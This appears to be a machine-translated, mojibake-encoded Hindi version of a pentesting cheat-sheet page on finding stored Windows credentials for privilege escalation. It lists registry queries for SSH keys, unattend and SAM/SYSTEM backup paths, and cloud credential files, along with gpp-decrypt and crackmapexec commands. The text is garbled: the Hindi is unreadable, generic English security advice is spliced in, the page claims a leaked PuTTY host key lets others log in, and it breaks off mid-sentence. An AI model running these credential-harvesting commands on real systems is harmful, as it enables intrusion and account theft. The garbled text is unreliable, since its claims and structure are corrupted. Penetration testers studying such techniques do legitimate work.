Putty SSH рд╣реЛрд╕реНрдЯ рдХреБрдВрдЬреА рдПрдХ рдЦреБрд▓рд╛ рд╕реНрд░реЛрдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ SSH рдХрдиреЗрдХреНрд╢рди рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЬрдм рдЖрдк Putty рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд░ рдкрд░ SSH рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ Putty рдЖрдкрдХреЛ рдЙрд╕ рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реЛрд╕реНрдЯ рдХреБрдВрдЬреА рджреЗрддрд╛ рд╣реИред

Putty SSH рд╣реЛрд╕реНрдЯ рдХреБрдВрдЬреА рдХреЛ рдЖрдкрдХреЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрдм рдЖрдк рдЙрд╕реА рд╕рд░реНрд╡рд░ рдкрд░ рдмрд╛рдж рдореЗрдВ рдлрд┐рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ Putty рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдк рд╡рд╣реА рд╕рд░реНрд╡рд░ рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рд╕рд╛рде рдкрд╣рд▓реЗ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реБрдП рдереЗред рдЗрд╕рдХреЗ рд▓рд┐рдП, Putty рдЙрд╕реА рд╣реЛрд╕реНрдЯ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИред

рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢, Putty SSH рд╣реЛрд╕реНрдЯ рдХреБрдВрдЬреА рд▓реАрдХ рд╣реЛ рдЬрд╛рддреА рд╣реИ, рддреЛ рдХреЛрдИ рднреА рдЕрдирдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдкрдХреЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЖрдкрдХреЗ рдирд╛рдо рд╕реЗ SSH рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдиреБрдХрд╕рд╛рди рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЖрдк рдЕрдкрдиреА Putty SSH рд╣реЛрд╕реНрдЯ рдХреБрдВрдЬреА рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦреЗрдВ рдФрд░ рдЙрд╕реЗ рдХрд┐рд╕реА рдЕрдирдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╣рд╛рдереЛрдВ рдореЗрдВ рди рдЫреЛрдбрд╝реЗрдВред
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ SSH рдХреБрдВрдЬреА

SSH рдирд┐рдЬреА рдХреБрдВрдЬреА рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА `HKCU\Software\OpenSSH\Agent\Keys` рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рд╡рд╣рд╛рдВ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдпрд╛ рдирд╣реАрдВ:
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
рдпрджрд┐ рдЖрдк рдЙрд╕ рдкрде рдореЗрдВ рдХреЛрдИ рдПрдВрдЯреНрд░реА рдЦреЛрдЬрддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рд╕рдВрднрд╡рддрдГ рдПрдХ рд╕рд╣реЗрдЬреА рдЧрдИ SSH рдХреБрдВрдЬреА рд╣реЛрдЧреАред рдпрд╣ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд░реВрдк рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИ рд▓реЗрдХрд┐рди [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдВ рдорд┐рд▓реЗрдЧреА: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

рдпрджрд┐ `ssh-agent` рд╕реЗрд╡рд╛ рдЪрд▓ рдирд╣реАрдВ рд░рд╣реА рд╣реИ рдФрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдмреВрдЯ рдкрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╢реБрд░реВ рд╣реЛ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдПрдВ:
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рддрдХрдиреАрдХ рдЕрдм рд╡реИрдз рдирд╣реАрдВ рд╣реИред рдореИрдВрдиреЗ рдХреБрдЫ SSH рдХреБрдВрдЬреА рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА, рдЙрдиреНрд╣реЗрдВ `ssh-add` рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдФрд░ SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдорд╢реАрди рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд┐рдпрд╛ред рд░рдЬрд┐рд╕реНрдЯреНрд░реА HKCU\Software\OpenSSH\Agent\Keys рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ рдФрд░ procmon рдиреЗ рд╡рд┐рд╖рдорд╛рдВрдХ рдХреБрдВрдЬреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рджреМрд░рд╛рди `dpapi.dll` рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рд╣реИред
{% endhint %}

### рдЕрдирджреЗрдЦреА рдлрд╝рд╛рдЗрд▓реЗрдВ
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
рдЖрдк рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ **рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЛрдЗрдЯ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ: _post/windows/gather/enum\_unattend_

рдЙрджрд╛рд╣рд░рдг рд╕рд╛рдордЧреНрд░реА\_:\_
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM рдФрд░ SYSTEM рдмреИрдХрдЕрдк

рдЬрдм рд╣рдо рд╡рд┐рдВрдбреЛрдЬ рдкреНрд░рдгрд╛рд▓реА рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирдпрди рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдореЗрдВ SAM рдФрд░ SYSTEM рдмреИрдХрдЕрдк рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

SAM рдлрд╝рд╛рдЗрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддреА рд╣реИ, рдЬрдмрдХрд┐ SYSTEM рдлрд╝рд╛рдЗрд▓ рд╡рд┐рдВрдбреЛрдЬ рдкреНрд░рдгрд╛рд▓реА рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддреА рд╣реИред

рдЗрди рдмреИрдХрдЕрдк рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рд╕рдВрдЧреНрд░рд╣реАрдд рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рдЕрдиреНрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдЙрджреНрдзреГрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЙрдиреНрдирдпрди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрди рдмреИрдХрдЕрдк рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рд╡рд┐рдВрдбреЛрдЬ рдкреНрд░рдгрд╛рд▓реА рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдЬреИрд╕реЗ рдХрд┐ `regedit`, `reg save`, рдпрд╛ `reg save hklm\sam sam`ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╣рдореЗрдВ рдЗрди рдмреИрдХрдЕрдк рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЙрджреНрдзреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдЙрдЪрд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП, рд╣рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдЙрдЪрд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

рдПрдХ рдмрд╛рд░ рдЬрдм рд╣рдореЗрдВ рдЗрди рдмреИрдХрдЕрдк рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓рд┐рдпрд╛ рд╣реЛрддрд╛ рд╣реИ, рд╣рдо рдЙрдиреНрд╣реЗрдВ рдЕрдиреБрдХрд░рдг рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЙрджреНрдзреГрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрдирдпрди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### рдХреНрд▓рд╛рдЙрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕

Cloud credentials are the authentication details used to access cloud services and resources. These credentials typically include a username and password, API keys, access tokens, or certificates. It is important to protect cloud credentials as they grant access to sensitive data and resources in the cloud environment.

#### Best Practices for Securing Cloud Credentials

1. **Use Strong and Unique Passwords**: Create strong and unique passwords for each cloud service account. Avoid using common or easily guessable passwords.

2. **Enable Multi-Factor Authentication (MFA)**: Enable MFA for all cloud service accounts to add an extra layer of security. MFA requires users to provide additional verification, such as a code sent to their mobile device, in addition to their password.

3. **Regularly Rotate Credentials**: Change passwords and access keys regularly to minimize the risk of unauthorized access. This is especially important when employees leave the organization or when credentials have been compromised.

4. **Implement Least Privilege**: Grant users the minimum level of access necessary to perform their tasks. Avoid giving unnecessary administrative privileges to reduce the potential impact of a compromised account.

5. **Securely Store and Transmit Credentials**: Store credentials in a secure password manager or vault. Avoid storing credentials in plain text or sharing them through insecure channels like email or messaging apps.

6. **Monitor and Audit Credential Usage**: Regularly monitor and review the usage of cloud credentials. Implement logging and auditing mechanisms to detect any suspicious activities or unauthorized access attempts.

7. **Regularly Update and Patch Cloud Services**: Keep cloud services and applications up to date with the latest security patches and updates. This helps protect against known vulnerabilities that could be exploited to gain unauthorized access.

By following these best practices, you can help ensure the security of your cloud credentials and minimize the risk of unauthorized access to your cloud resources.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

рдПрдХ рдлрд╝рд╛рдЗрд▓ рдвреВрдВрдвреЗрдВ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо **SiteList.xml** рд╣реИред

### рдХреИрд╢ рдХрд┐рдП рдЧрдП GPP рдкрд╛рд╕рд╡рд░реНрдб

KB2928120 рд╕реЗ рдкрд╣рд▓реЗ (MS14-025 рджреЗрдЦреЗрдВ), рдХреБрдЫ рдЧреНрд░реБрдк рдиреАрддрд┐ рд╡рд░реАрдпрддрд╛рдПрдБ рдПрдХ рдХрд╕реНрдЯрдо рдЦрд╛рддреЗ рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЬрд╛ рд╕рдХрддреА рдереАред рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдореБрдЦреНрдп рдЙрдкрдпреЛрдЧ рдПрдХ рд╕рдореВрд╣ рдореЗрдВ рдХрд╕реНрдЯрдо рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддрд╛ рдбрд┐рдкреНрд▓реЙрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рдерд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдореЗрдВ рджреЛ рд╕рдорд╕реНрдпрд╛рдПрдВ рдереАрдВред рдкрд╣рд▓реА рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐, рдХреНрдпреЛрдВрдХрд┐ рдЧреНрд░реБрдк рдиреАрддрд┐ рдСрдмреНрдЬреЗрдХреНрдЯ XML рдлрд╝рд╛рдЗрд▓реЗрдВ SYSVOL рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВ, рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрдиреНрд╣реЗрдВ рдкрдврд╝ рд╕рдХрддрд╛ рд╣реИред рджреВрд╕рд░реА рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЗрди GPP рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде AES256-рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХреГрдд рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдмрд╣реБрдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ рдФрд░ рд╡реЗ рдЕрдкрдиреА рдорд╢реАрди рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдбреЛрдореЗрди рдкрд░ рдЕрдкрдиреА рдкреНрд░рднреБрддрд╛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рднреА рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдХреИрд╢ рдХрд┐рдП рдЧрдП GPP рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдЧреИрд░-рдЦрд╛рд▓реА "cpassword" рдлрд╝реАрд▓реНрдб рд╣реИред рдпрджрд┐ рд╣рд╛рдВ, рддреЛ рдпрд╣ рдЗрд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдЧрд╛ рдФрд░ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕реНрдерд╛рди рдХреЗ рд╕рд╛рде рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реБрдП рдПрдХ рдХрд╕реНрдЯрдо рдкреАрдПрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рд▓реМрдЯрд╛рдПрдЧрд╛ред

рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП `C:\ProgramData\Microsoft\Group Policy\history` рдпрд╛ _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista рд╕реЗ рдкрд╣рд▓реЗ)_ рдореЗрдВ рдЦреЛрдЬреЗрдВ:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPassword рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
рдХреНрд░реИрдХрдореИрдкреЗрдХреНрд╕реЗрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛:
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS рд╡реЗрдм рдХреЙрдиреНрдлрд╝рд┐рдЧ

IIS рд╡реЗрдм рдХреЙрдиреНрдлрд╝рд┐рдЧ рдПрдХ XML рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬреЛ IIS (рдЗрдВрдЯрд░рдиреЗрдЯ рдЗрдирдлрд╝реЛрд░реНрдореЗрд╢рди рд╕реЗрд╡рд╛рдПрдВ) рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддреА рд╣реИред рдпрд╣ рдлрд╝рд╛рдЗрд▓ IIS рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИ, рдЬреИрд╕реЗ рд╡реЗрдм рд╕рд╛рдЗрдЯреЛрдВ, рд╡рд░реНрдЪреБрдЕрд▓ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА, рдФрд░ рдРрдк рдкреВрд▓ред

рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реЗрдХреНрд╢рди рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рд╡реЗрдм рд╕рд╛рдЗрдЯ рдХрд╛ рдирд╛рдо, рдлрд╝рд╛рдЗрд▓ рд╕рдВрдЧреНрд░рд╣рдг рд╕реНрдерд╛рди, рдЕрдиреБрдорддрд┐рдпрд╛рдБ, рдФрд░ рдЕрдиреНрдп рд╕реЗрдЯрд┐рдВрдЧреНрд╕ред рдЗрди рд╕реЗрдХреНрд╢рдиреЛрдВ рдХреЛ рдЖрдкрдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, IIS рд╡реЗрдм рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рднреА рд╣реЛрддреА рд╣реИрдВ рдЬреЛ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИрдВред рдЗрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рдЖрдк рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд▓реЛрдХрд▓ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдЖрдкрдХреЛ рд▓реЛрдХрд▓ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рд╣реИ, рддреЛ рдЖрдк IIS рд╡реЗрдм рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХрд┐рд╕реА рднреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рд▓реЛрдХрд▓ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
Get-Childitem тАУPath C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem тАУPath C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem тАУPath C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
рдпреЛрдЧреНрдпрддрд╛ рд╡рд╛рд▓реЗ web.config рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕

To establish a secure connection with an OpenVPN server, you will need the following credentials:

- **Username**: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо
- **Password**: рдкрд╛рд╕рд╡рд░реНрдб

These credentials are provided by the OpenVPN server administrator. Make sure to keep them confidential and do not share them with anyone.

### OpenVPN рд╕рд╛рдзрд╛рд░рдг рд╕рдорд╕реНрдпрд╛рдПрдВ

рдпрджрд┐ рдЖрдкрдХреЛ OpenVPN рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рд╕рд╛рдорд╛рдиреНрдп рд╕рдорд╕реНрдпрд╛ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдкрдбрд╝рддрд╛ рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ:

